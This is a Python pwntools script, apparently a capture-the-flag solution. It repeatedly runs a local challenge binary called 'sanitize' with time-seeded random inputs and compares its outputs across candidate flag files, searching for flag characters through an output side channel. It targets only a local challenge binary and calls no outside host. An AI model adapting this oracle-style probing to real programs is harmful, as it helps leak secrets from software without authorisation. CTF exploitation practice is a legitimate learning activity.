
from pwn import *  
from time import *
context.log_level = 'error'

seed = int(time())
def rand():
    global seed
    seed = seed * 0x343FD + 0x269EC3
    return (seed >> 16) & 0x7FFF  
flag = 'flag{'
check0 = []
compare = []

g = open('payload','w')
h = open('check','w')
for i in range(0x20,0x7e):
    while(True):
        f = open('flag','w+')
        f.write(flag+chr(i)+'a'*20)
        f.close()
        payload = ''
        for j in range(5):
            payload += chr((rand()%(0x7f-0x20))+0x20)
        payload += '\n'
        payload+=str(3)+'\n'+str(5)+'\n'+str(1)+'\n'+str(0)+'\n'
        p = process('./sanitize')
        p.send(payload)
        s = p.recv()
        p.close()

        f = open('flag','w+')
        f.write(flag+chr(i+1)+'a'*20)
        f.close()

        p = process('./sanitize')
        p.send(payload)
        r = p.recv()
        p.close()

        if s!=r:
            g.write(payload)
            h.write(s)
            check0.append(s)
            print(chr(i))
            break
g.close()
h.close()